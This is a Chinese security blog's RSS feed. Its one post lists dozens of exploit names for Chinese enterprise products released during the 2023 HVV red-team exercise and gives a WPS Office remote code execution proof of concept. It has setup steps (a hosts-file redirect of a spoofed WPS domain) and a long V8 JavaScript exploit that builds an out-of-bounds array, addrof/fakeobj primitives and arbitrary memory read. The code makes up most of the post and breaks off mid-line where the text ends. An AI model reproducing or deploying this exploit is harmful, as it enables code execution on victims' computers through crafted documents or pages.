<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>方糖</title>
    <link>https://0a00.github.io/</link>
    
    <atom:link href="https://0a00.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>嘿嘿 呼呼 嘻嘻 哈哈</description>
    <pubDate>Sun, 20 Aug 2023 08:52:17 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>HVV-2023-wps-rce</title>
      <link>https://0a00.github.io/2023/08/20/hvv2023wps-rce/</link>
      <guid>https://0a00.github.io/2023/08/20/hvv2023wps-rce/</guid>
      <pubDate>Sun, 20 Aug 2023 08:37:55 GMT</pubDate>
      
      <description>2023 hvv wps 代码执行</description>
      
      
      
      <content:encoded><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p></div><div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>08-20</p></div></div><div class='timeline-item-content'><p>永远新的开始啊</p><h1 id="2023-HVV-0day-x2F-Nday-x2F-POC-x2F-EXP-一键鈤卫星系列之-WPS-代码执行-威胁情报"><a href="#2023-HVV-0day-x2F-Nday-x2F-POC-x2F-EXP-一键鈤卫星系列之-WPS-代码执行-威胁情报" class="headerlink" title="2023 HVV 0day &#x2F; Nday &#x2F; POC &#x2F; EXP  一键鈤卫星系列之 WPS 代码执行-威胁情报"></a><strong>2023 HVV 0day &#x2F; Nday &#x2F; POC &#x2F; EXP  一键鈤卫星系列之</strong> WPS 代码执行-威胁情报</h1><h1 id="漏洞情报列表"><a href="#漏洞情报列表" class="headerlink" title="漏洞情报列表"></a>漏洞情报列表</h1><ul><li>安**御运维审计与风险控制系统堡垒机任意用户注册</li><li>致*oa 任意文件上传</li><li>致*oa rce</li><li>用*移动管理系统 uploadApk.d</li><li>用*时空KSOA PayBill SQL注入漏洞</li><li>网* SecSSL 3600安全接入网关系统 任意密码修改漏洞</li><li>网* SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞</li><li>通*oaCVE-2023-4166</li><li>通*oa_sql注入</li><li>天*网关前台SQL注入</li><li>深*服应用交付系统命令执行漏洞</li><li>深*服报表</li><li>绿*sas安全审计系统任意文件读取漏洞</li><li>绿* SAS堡垒机 local_user.php 任意用户登录漏洞</li><li>绿* SAS堡垒机 Exec 远程命令执行漏洞</li><li>蓝*-OA-RCE</li><li>金*OA C6-GetSqlData.aspx SQL注入漏洞 POC</li><li>汉*SRM tomcat.jsp 登录绕过漏洞</li><li>海**视前台上传</li><li>广*达oa 后台文件上传漏洞</li><li>绿* NF 下一代防火墙 任意文件上传漏洞</li><li>HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞</li><li>HiKVISION 综合安防管理平台 env 信息泄漏漏洞</li><li>禅* 16.5 router.class.php SQL注入漏洞</li><li>网* SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞</li><li>金*OA 未授权</li><li>宏*OA文件上传</li><li>用*畅捷通 T注入</li><li>用*时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入</li><li>用*时空 KSOATaskRequestServlet sql注入漏洞</li><li>宏* HCM codesettree SQL 注入漏洞</li><li>泛* ShowDocsImagesql注入漏洞</li><li>3<em>0 新天</em>终端安全管理系统信息泄露漏洞</li><li>企业微*（私有化版本）敏感信息泄露漏洞</li><li>华*动力oa SQL注入</li><li>用*文件服务器认证绕过</li><li>广联&amp; Linkworks GetIMDictionarySQL 注入漏洞</li><li>网* ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞</li><li>Panel loadfile 后台文件读取漏洞</li><li>金* 微信管理平台 getsysteminfo 未授权访问漏洞</li><li>PigCMS action_flashUpload 任意文件上传漏洞</li><li>Coremail 邮件系统未授权访问获取管理员账密</li><li>Milesight VPN server.js 任意文件读取漏洞</li><li>红* oa 注入</li><li>nginx配置错误导致的路径穿越风险</li><li>用*GRP-U8存在信息泄露</li><li>启**辰-4A 统一安全管控平台 getMater 信息泄漏</li><li>广*达oa sql注入漏洞</li><li>泛*oa代码执行</li><li>泛*E-Office9文件上传漏洞</li><li>泛* Weaver E-Office9 前台文件包含</li><li>泛* E-Cology 某版本 SQL注入漏洞 POC</li><li>大*智慧园区综合管理平台 文件上传漏洞</li><li>大*智慧园区综合管理平台 searchJson SQL注入漏洞</li><li>大*智慧园区任意密码读取攻击</li><li>辰*景云终端安全管理系统 login SQL注入漏洞</li><li>x捷 xBR 路由器 任意文件上传漏洞</li><li>wps 代码执行</li><li>Openfire身份认证绕过漏洞</li><li>Nacos-Sync</li><li>Eramba任意代码执行漏洞</li><li>绿* NF 下一代防火墙 任意文件上传漏洞</li><li>HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞</li><li>HiKVISION 综合安防管理平台 env 信息泄漏漏洞</li><li>禅* 16.5 router.class.php SQL注入漏洞</li><li>网* SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞</li><li>金*OA 未授权</li><li>宏*OA文件上传</li><li>用*畅捷通 T注入</li><li>用*时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入</li><li>用*时空 KSOATaskRequestServlet sql注入漏洞</li><li>宏* HCM codesettree SQL 注入漏洞</li><li>泛* ShowDocsImagesql注入漏洞</li><li>36* 新天擎终端安全管理系统信息泄露漏洞</li><li>企业微信（私有化版本）敏感信息泄露漏洞</li><li>华天*力oa SQL注入</li><li>用*文件服务器认证绕过</li><li>广*达 Linkworks GetIMDictionarySQL 注入漏洞</li><li>网* ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞</li><li>Panel loadfile 后台文件读取漏洞</li><li>金* 微信管理平台 getsysteminfo 未授权访问漏洞</li><li>PigCMS action_flashUpload 任意文件上传漏洞</li><li>Coremail 邮件系统未授权访问获取管理员账密</li><li>Milesight VPN server.js 任意文件读取漏洞</li><li>红* oa 注入</li><li>nginx配置错误导致的路径穿越风险</li><li>用*GRP-U8存在信息泄露</li><li>启**辰-4A 统一安全管控平台 getMater 信息泄漏</li></ul><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>wps影响范围为：</p><p>WPS Office 2023 个人版 &lt; 11.1.0.15120</p><p>WPS Office 2019 企业版 &lt; 11.8.2.12085</p><p>POC</p><p>在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p><p>127.0.0.1 <a href="http://clientweb.docer.wps.cn.cloudwps.cn/">clientweb.docer.wps.cn.cloudwps.cn</a></p><p><a href="http://漏洞触发需让域名规则满足clientweb.docer.wps.cn/">漏洞触发需让域名规则满足clientweb.docer.wps.cn</a>.{xxxxx}<a href="http://wps.cn/">wps.cn</a> cloudwps.cn和wps.cn没有任何关系</p><p>代码块在底下。（需要原pdf加wechat）</p><h1 id="Pyload"><a href="#Pyload" class="headerlink" title="Pyload:"></a>Pyload:</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> alert === <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">alert = <span class="variable language_">console</span>.<span class="property">log</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">v</span>) &#123;</span><br><span class="line"></span><br><span class="line">f64[<span class="number">0</span>] = v;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> u32;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">lo, hi</span>) &#123;</span><br><span class="line"></span><br><span class="line">u32[<span class="number">0</span>] = lo;</span><br><span class="line"></span><br><span class="line">u32[<span class="number">1</span>] = hi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>)&#123; <span class="comment">// major</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">bug</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">C</span>(<span class="params">z</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Error</span>.<span class="property">prepareStackTrace</span> = <span class="keyword">function</span>(<span class="params">t, B</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> B[z].<span class="title function_">getThis</span>();</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="title class_">Error</span>().<span class="property">stack</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Error</span>.<span class="property">prepareStackTrace</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">J</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> optim = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> opt = <span class="keyword">new</span> <span class="title class_">Function</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;if(typeof a===\&#x27;number\&#x27;)&#123;if(a&gt;2)&#123;for(var</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i=0;i&lt;100;i++);return;&#125;b.d(a,b,1);return&#125;&#x27;</span> +</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;g++;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">70</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> e = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">J.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">d</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;&quot;use strict&quot;;b.a.call(arguments,b);return arguments[a];&#x27;</span>);</span><br><span class="line"></span><br><span class="line">J.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a.b(0,a)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">J.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">b</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;b.c();if(a)&#123;&#x27;</span> +</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;g++;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">70</span>) + <span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">J.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">c</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optim) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> z = <span class="title function_">C</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">C</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">z[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">e = &#123;<span class="attr">M</span>: z, <span class="attr">C</span>: p&#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">J</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// jit optim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bug) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> V = <span class="number">0</span>; <span class="number">1E4</span> &gt; V; V++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_">opt</span>(<span class="number">0</span> == V % <span class="number">4</span> ? <span class="number">1</span> : <span class="number">4</span>, a, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">optim = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">opt</span>(<span class="number">1</span>, a, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> e;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">e1 = <span class="title function_">foo</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">e2 = <span class="title function_">foo</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> e2.<span class="property">M</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = e2.<span class="property">C</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&#x27;asd&#x27;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">delete</span>(<span class="string">&quot;asd&quot;</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x20</span>, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr4 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr5 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array = [];</span><br><span class="line"></span><br><span class="line">oob_array.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line"></span><br><span class="line">map.<span class="title function_">set</span>(<span class="string">&quot;1&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj_array = &#123;</span><br><span class="line"></span><br><span class="line"><span class="attr">m</span>: <span class="number">1337</span>, <span class="attr">target</span>: gc</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object_idx = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object_idx_flag = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> max_size = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; max_size; i++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">d2u</span>(oob_array[i])[<span class="number">0</span>] === <span class="number">0xa72</span>) &#123;</span><br><span class="line"></span><br><span class="line">object_idx = i;</span><br><span class="line"></span><br><span class="line">object_idx_flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">if</span> (<span class="title function_">d2u</span>(oob_array[i])[<span class="number">1</span>] === <span class="number">0xa72</span>) &#123;</span><br><span class="line"></span><br><span class="line">object_idx = i + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">object_idx_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj_para</span>) &#123;</span><br><span class="line"></span><br><span class="line">obj_array.<span class="property">target</span> = obj_para;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> addr = <span class="title function_">d2u</span>(oob_array[object_idx])[object_idx_flag] - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">obj_array.<span class="property">target</span> = gc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> addr;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r8 = <span class="title function_">d2u</span>(oob_array[object_idx]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (object_idx_flag === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">oob_array[object_idx] = <span class="title function_">u2d</span>(addr, r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">oob_array[object_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> obj_array.<span class="property">target</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bk_idx = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bk_idx_flag = <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; max_size; i++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">d2u</span>(oob_array[i])[<span class="number">0</span>] === <span class="number">1337</span>) &#123;</span><br><span class="line"></span><br><span class="line">bk_idx = i;</span><br><span class="line"></span><br><span class="line">bk_idx_flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">if</span> (<span class="title function_">d2u</span>(oob_array[i])[<span class="number">1</span>] === <span class="number">1337</span>) &#123;</span><br><span class="line"></span><br><span class="line">bk_idx = i + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">bk_idx_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_32</span>(<span class="params">addr</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r8 = <span class="title function_">d2u</span>(oob_array[bk_idx]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bk_idx_flag === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(addr, r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span 